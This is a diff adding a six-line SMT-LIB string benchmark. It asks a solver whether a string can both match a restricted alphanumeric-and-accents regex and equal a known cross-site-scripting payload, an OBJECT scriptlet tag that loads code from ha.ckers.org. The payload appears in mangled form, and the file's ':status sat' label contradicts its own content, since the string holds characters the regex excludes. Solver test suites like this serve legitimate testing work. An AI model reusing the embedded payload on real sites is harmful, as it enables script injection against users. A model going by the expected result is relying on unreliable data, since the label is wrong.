@@ -1,0 +1,6 @@
+(set-logic QF_S)
+(set-info :status sat)
+(declare-const x String)
+(assert (str.in_re x (re.from_ecma2020 "[A-Za-z0-9éèàêâùïüëÉÈÜ -]{2,30}")))
+(assert (= x "<;OBJECT TYPE="";text/x-scriptlet""; DATA="";http://ha.ckers.org/scriptlet.html"";>;<;/OBJECT>;"))
+(check-sat)
